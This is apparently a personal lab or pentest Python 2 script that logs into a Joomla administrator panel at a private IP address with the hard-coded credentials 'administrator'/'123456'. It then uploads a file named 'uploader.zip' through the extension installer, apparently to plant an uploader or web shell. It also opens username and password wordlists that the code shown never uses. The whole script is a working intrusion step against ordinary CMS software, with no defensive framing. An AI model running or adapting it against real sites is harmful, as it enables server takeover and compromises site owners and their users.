#!/usr/bin/python

from selenium import webdriver
from bs4 import BeautifulSoup
import mechanize, requests
import urllib2 ,urllib

users_file = open("/root/PycharmProjects/untitled/project/scanner/username.txt", "r")
password_file = open("/root/PycharmProjects/untitled/project/scanner/password.txt", "r")
br = mechanize.Browser()

br2 = br.open("http://192.168.60.153/joomlatest/administrator/index.php?option=com_installer")


br.select_form(nr=0)
br.form["username"] = "administrator"
br.form["passwd"] = "123456"
br.submit()
readingPage = br.response().code
if readingPage == 200:
  print "login success"

for form in br.forms():
    print form
br.select_form(nr=0)
# br['install_url']='uploader.zip'
# br.form["new_name"] = "this is not helpp"
br.form.set_all_readonly(False)
br.form.add_file(open('uploader.zip'), '', 'uploader.zip')
br.submit()
